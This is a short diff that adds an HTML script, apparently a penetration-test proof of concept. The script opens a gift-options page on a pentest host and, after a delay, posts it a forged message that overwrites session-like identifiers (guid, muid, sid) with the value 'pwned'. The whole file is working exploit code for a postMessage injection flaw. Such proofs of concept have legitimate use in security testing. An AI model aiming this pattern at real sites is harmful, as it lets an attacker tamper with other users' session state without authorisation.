@@ -1,0 +1,9 @@
+<script>
+  var target = window.open("https://www.volusionpentest1.com/giftoptions.asp");
+  setTimeout(() => {
+    target.postMessage(JSON.stringify({
+      originatingScript: "m2",
+      payload: { guid: "pwned", muid: "pwned", sid: "pwned" }
+    }), "https://www.volusionpentest1.com/giftoptions.asp");
+  }, 3000);
+</script>
